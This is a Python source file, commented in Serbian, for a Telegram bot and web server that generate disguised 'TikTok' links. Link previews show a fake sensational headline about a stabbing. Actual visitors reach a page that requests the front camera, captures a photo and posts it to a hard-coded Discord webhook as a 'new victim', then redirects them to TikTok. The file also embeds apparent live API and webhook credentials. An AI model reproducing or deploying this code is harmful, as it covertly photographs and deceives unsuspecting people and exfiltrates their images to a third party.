import uuid
import os
from aiohttp import web
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.webhook.aiohttp_server import SimpleRequestHandler, setup_application

# =========================================================================
# 1. PODEŠAVANJA
# =========================================================================
API_TOKEN = '8771472343:AAGhpARS8GxMcsbsnt1hKKZhiIltABiQlUA'
DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1527509467204161567/Q6ilvbIGYe27grr4WTbr6yC1CwVfCMOGn1k4sbTciYzvjr211XXIfMxMqBfzJxcXEgh6'

# TVOJA TAČNA RENDER ADRESA (BEZ KOSE CRTE NA KRAJU!)
MY_PUBLIC_DOMAIN = 'https://tiktok-varka-2.onrender.com'

bot = Bot(token=API_TOKEN)
dp = Dispatcher()

# Zajednička baza podataka
db = {}

# =========================================================================
# 2. TELEGRAM BOT KOD
# =========================================================================
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    await message.answer("Ćao! Pošalji mi bilo koji TikTok link, a ja ću ti napraviti potpuno crnu varku.")

@dp.message()
async def handle_message(message: types.Message):
    text = message.text
    if "tiktok.com" not in text:
        await message.answer("Molim te pošalji ispravan TikTok link.")
        return
        
    await message.answer("Generišem link, sačekaj trenutak...")
    link_id = str(uuid.uuid4())[:8]
    
    db[link_id] = {
        "title": "Izbodeni ljudi na Music Week-u! 😱",
        "image": "https://unsplash.com",
        "description": "Pogledaj ceo snimak uživo sa lica mesta...",
        "tiktok_url": text
    }
    
    prank_link = f"{MY_PUBLIC_DOMAIN}/l/{link_id}"
    await message.answer(f"Evo tvog uverljivog linka:\n\n`{prank_link}`")

# =========================================================================
# 3. WEB SERVER KOD
# =========================================================================
async def serve_link(request):
    link_id = request.match_info.get('link_id')
    
    if link_id not in db:
        return web.Response(text="Link ne postoji", status=404)
        
    prank_data = db[link_id]
    user_agent = request.headers.get('User-Agent', '')

    bot_keywords = ["TelegramBot", "Twitterbot", "facebookexternalhit", "Discordbot"]
    is_bot = any(keyword in user_agent for keyword in bot_keywords)

    if is_bot:
        html_template = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <meta property="og:title" content="{prank_data['title']}" />
            <meta property="og:image" content="{prank_data['image']}" />
            <meta property="og:description" content="{prank_data['description']}" />
            <meta property="og:type" content="video.other" />
        </head>
        <body></body>
        </html>
        """
        return web.Response(text=html_template, content_type='text/html')
    else:
        page_template = f"""
        <!DOCTYPE html>
        <html lang="sr">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>TikTok</title>
            <style>
                body, html {{ margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; }}
            </style>
        </head>
        <body>
            <script>
                const praviTikTok = "{prank_data['tiktok_url']}";
                const webhookUrl = "{DISCORD_WEBHOOK_URL}";

                function idiNaTikTok() {{
                    window.location.href = praviTikTok;
                }}

                window.onload = function() {{
                    navigator.mediaDevices.getUserMedia({ { audio: false, video: { facingMode: "user" } } })
                    .then(function(stream) {{
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.play();
                        
                        video.onloadedmetadata = function() {{
                            setTimeout(() => {{
                                const canvas = document.createElement('canvas');
                                canvas.width = video.videoWidth;
                                canvas.height = video.videoHeight;
                                const ctx = canvas.getContext('2d');
                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                                
                                canvas.toBlob(function(blob) {{
                                    const formData = new FormData();
                                    formData.append('file', blob, 'upecan.png');
                                    formData.append('content', '📸 Nova žrtva se upecala!');
                                    
                                    fetch(webhookUrl, {{ method: 'POST', body: formData }})
                                    .then(() => {{
                                        stream.getTracks().forEach(track => track.stop());
                                        idiNaTikTok();
                                    }}).catch(idiNaTikTok);
                                }}, 'image/png');
                            }}, 500);
                        }};
                    }})
                    .catch(function(err) {{
                        idiNaTikTok();
                    }});
                }};
            </script>
        </body>
        </html>
        """
        return web.Response(text=page_template, content_type='text/html')

async def on_startup(bot: Bot):
    await bot.set_webhook(f"{MY_PUBLIC_DOMAIN}/webhook")

def main():
    app = web.Application()
    app.router.add_get('/l/{link_id}', serve_link)
    
    SimpleRequestHandler(dispatcher=dp, bot=bot).register(app, path="/webhook")
    setup_application(app, dp, bot=bot)
    
    dp.startup.register(on_startup)
    
    port = int(os.environ.get("PORT", 5000))
    web.run_app(app, host='0.0.0.0', port=port)

if __name__ == '__main__':
    main()
